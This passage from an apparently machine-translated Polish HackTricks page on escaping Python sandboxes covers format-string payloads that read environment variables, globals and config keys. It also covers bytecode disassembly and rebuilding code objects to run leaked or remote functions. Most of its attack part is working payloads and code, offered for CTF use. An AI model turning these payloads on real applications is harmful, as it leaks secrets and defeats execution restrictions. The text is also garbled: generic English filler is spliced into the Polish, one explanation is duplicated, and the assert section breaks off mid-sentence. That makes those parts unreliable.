
except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
Możesz sprawdzić wynik tego skryptu na tej stronie:

{% content-ref url="broken-reference" %}
[Uszkodzony link](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi twoją powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python Format String

Jeśli **przesyłasz** do pythona **ciąg znaków**, który ma być **sformatowany**, możesz użyć `{}` do uzyskania dostępu do **wewnętrznych informacji pythona**. Możesz na przykład użyć wcześniejszych przykładów do uzyskania dostępu do globalnych zmiennych lub wbudowanych funkcji.

{% hint style="info" %}
Jednak istnieje **ograniczenie**, możesz używać tylko symboli `.[]`, więc **nie będziesz w stanie wykonać dowolnego kodu**, tylko odczytać informacje.\
_**Jeśli wiesz, jak wykorzystać tę podatność do wykonania kodu, skontaktuj się ze mną.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Zauważ, że możesz **uzyskać dostęp do atrybutów** w normalny sposób za pomocą **kropki** jak `people_obj.__init__` oraz do **elementów słownika** za pomocą **nawiasów** bez cudzysłowu `__globals__[CONFIG]`.

Zauważ również, że możesz użyć `.__dict__` do wyliczenia elementów obiektu `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`.

Inną interesującą cechą formatowania ciągów jest możliwość **wykonania** funkcji **`str`**, **`repr`** i **`ascii`** w wskazanym obiekcie, dodając odpowiednio **`!s`**, **`!r`**, **`!a`**:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
Ponadto, istnieje możliwość **kodowania nowych formatowników** w klasach:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**Więcej przykładów** dotyczących **formatowania** **łańcuchów** można znaleźć na stronie [**https://pyformat.info/**](https://pyformat.info)

{% hint style="danger" %}
Sprawdź również następującą stronę w celu znalezienia narzędzi, które będą **odczytywać poufne informacje z wewnętrznych obiektów Pythona**:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### Payloady ujawniania poufnych informacji
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Analiza obiektów Pythona

{% hint style="info" %}
Jeśli chcesz **dowiedzieć się** więcej o **bajtkodzie Pythona**, przeczytaj ten **niesamowity** artykuł na ten temat: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

W niektórych CTF-ach możesz otrzymać nazwę **niestandardowej funkcji, w której znajduje się flaga**, i musisz zobaczyć **wewnętrzności** tej funkcji, aby ją wydobyć.

Oto funkcja do zbadania:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir

`dir` is a built-in function in Python that returns a list of names in the current local scope or a specified object's attributes.

`dir` jest wbudowaną funkcją w Pythonie, która zwraca listę nazw w bieżącym zakresie lokalnym lub atrybuty określonego obiektu.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` i `func_globals` (To samo) Pobiera globalne środowisko. W przykładzie można zobaczyć importowane moduły, niektóre zmienne globalne i ich zawartość zadeklarowaną:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Zobacz tutaj więcej miejsc do uzyskania globalnych zmiennych**](./#globals-and-locals)

### **Uzyskiwanie dostępu do kodu funkcji**

**`__code__`** i `func_code`: Możesz **uzyskać dostęp** do tego **atrybutu** funkcji, aby **uzyskać obiekt kodu** funkcji.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### Uzyskiwanie informacji o kodzie

To understand how to bypass Python sandboxes, it is crucial to gather information about the code running within the sandbox. This information will help in identifying potential vulnerabilities and finding ways to exploit them.

#### 1. Inspecting the Code

The first step is to inspect the code running within the sandbox. This can be done by analyzing the source code or decompiling the bytecode. By understanding the logic and functionality of the code, it becomes easier to identify potential weaknesses.

#### 2. Identifying Imported Modules

Next, it is important to identify the imported modules within the code. This can be done by analyzing the `import` statements or by inspecting the bytecode. Knowing the imported modules can provide insights into the capabilities and limitations of the sandbox.

#### 3. Analyzing Function Calls

Analyzing the function calls within the code can reveal valuable information. By understanding the functions being called and their parameters, it becomes possible to identify potential vulnerabilities or ways to bypass the sandbox.

#### 4. Examining External Dependencies

Many Python applications rely on external dependencies, such as libraries or frameworks. It is crucial to identify these dependencies and analyze their functionalities. Vulnerabilities in external dependencies can often be exploited to bypass the sandbox.

#### 5. Understanding Code Execution Flow

Understanding the code execution flow is essential for bypassing Python sandboxes. By analyzing the control flow of the code, it becomes possible to identify potential weaknesses or areas where the sandbox can be bypassed.

#### 6. Analyzing Error Messages

Error messages can provide valuable information about the code running within the sandbox. By analyzing the error messages, it becomes possible to identify potential vulnerabilities or ways to bypass the sandbox.

#### 7. Monitoring System Calls

Monitoring system calls made by the code can provide insights into its behavior and capabilities. By analyzing the system calls, it becomes possible to identify potential vulnerabilities or ways to bypass the sandbox.

By gathering information about the code running within the Python sandbox, it becomes easier to identify potential vulnerabilities and find ways to bypass the sandbox. This information can be used to develop effective exploitation techniques and achieve the desired objectives.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **Rozkładanie funkcji**

Aby zrozumieć, jak działa funkcja w Pythonie i znaleźć potencjalne luki w zabezpieczeniach, można rozłożyć funkcję na mniejsze części. Proces ten nazywa się rozkładaniem funkcji (disassembly).

Rozkładanie funkcji polega na analizie kodu bajtowego funkcji, który jest bezpośrednio wykonywany przez interpreter Pythona. Można to zrobić za pomocą narzędzi takich jak `dis` lub `disassembler`.

Rozkładanie funkcji pozwala zobaczyć, jakie instrukcje są wykonywane przez funkcję, jakie argumenty są przekazywane i jakie wartości są zwracane. Może to pomóc w identyfikacji potencjalnych luk w zabezpieczeniach, takich jak nieprawidłowe sprawdzanie uprawnień, niewłaściwe walidowanie danych wejściowych lub niebezpieczne operacje na plikach.

Przykład użycia narzędzia `dis`:

```python
import dis

def my_function():
    x = 5
    y = 10
    z = x + y
    print(z)

dis.dis(my_function)
```

Ten kod rozkłada funkcję `my_function` i wyświetla jej kod bajtowy. Można zobaczyć, jakie instrukcje są wykonywane, jakie argumenty są przekazywane i jakie wartości są zwracane.

Rozkładanie funkcji jest przydatnym narzędziem podczas analizy kodu źródłowego Pythona i może pomóc w identyfikacji potencjalnych luk w zabezpieczeniach.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
Zauważ, że **jeśli nie możesz zaimportować `dis` w piaskownicy Pythona**, możesz uzyskać **kod bajtowy** funkcji (`get_flag.func_code.co_code`) i **rozłożyć go na instrukcje** lokalnie. Nie zobaczysz zawartości wczytywanych zmiennych (`LOAD_CONST`), ale możesz je zgadnąć na podstawie (`get_flag.func_code.co_consts`), ponieważ `LOAD_CONST` również podaje przesunięcie wczytywanej zmiennej.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Kompilowanie Pythona

Teraz, wyobraźmy sobie, że w jakiś sposób możesz **wydobyć informacje o funkcji, której nie możesz wykonać**, ale **musisz** ją **wykonać**.\
Tak jak w poniższym przykładzie, **możesz uzyskać dostęp do obiektu kodu** tej funkcji, ale czytając rozkład, **nie wiesz, jak obliczyć flagę** (_wyobraź sobie bardziej skomplikowaną funkcję `calc_flag`_).
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### Tworzenie obiektu kodu

Przede wszystkim musimy wiedzieć, **jak stworzyć i wykonać obiekt kodu**, abyśmy mogli stworzyć taki obiekt do wykonania naszej wyciekającej funkcji:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
W zależności od wersji Pythona **parametry** `code_type` mogą mieć **inny porządek**. Najlepszym sposobem, aby poznać kolejność parametrów w wersji Pythona, którą używasz, jest uruchomienie:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### Odtwarzanie wyciekłej funkcji

{% hint style="warning" %}
W poniższym przykładzie będziemy pobierać wszystkie dane potrzebne do odtworzenia funkcji bezpośrednio z obiektu kodu funkcji. W **rzeczywistym przykładzie** wszystkie **wartości** potrzebne do wykonania funkcji **`code_type`** to to, co **będziesz musiał wyciec**.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Omijanie obronności

W poprzednich przykładach na początku tego postu można zobaczyć, **jak wykonać dowolny kod Pythona za pomocą funkcji `compile`**. Jest to interesujące, ponieważ można **wykonać całe skrypty** z pętlami i wszystkim w **jednym wierszu** (i można to zrobić również za pomocą **`exec`**).\
W każdym razie, czasami może być przydatne **utworzenie** skompilowanego obiektu na lokalnej maszynie i wykonanie go na maszynie **CTF** (na przykład, gdy nie mamy funkcji `compile` na maszynie CTF).

Na przykład, skompilujmy i wykonajmy ręcznie funkcję, która czyta _./poc.py_:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
Jeśli nie masz dostępu do `eval` lub `exec`, możesz utworzyć **właściwą funkcję**, ale jej bezpośrednie wywołanie zazwyczaj zakończy się niepowodzeniem z komunikatem: _konstruktor niedostępny w trybie ograniczonym_. Dlatego potrzebujesz **funkcji, która nie znajduje się w środowisku o ograniczonym dostępie, aby wywołać tę funkcję**.
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Dekompilowanie skompilowanego kodu Pythona

Za pomocą narzędzi takich jak [**https://www.decompiler.com/**](https://www.decompiler.com) można **dekompilować** podany skompilowany kod Pythona.

**Sprawdź ten samouczek**:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## Różne Python

### Assert

Python uruchomiony z optymalizacjami z parametrem `-O` usunie instrukcje assert oraz kod warunkowy zależny od wartości **debug**.\
Dlatego też, sprawdzenia takie jak
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## Odwołania

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi twoją powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
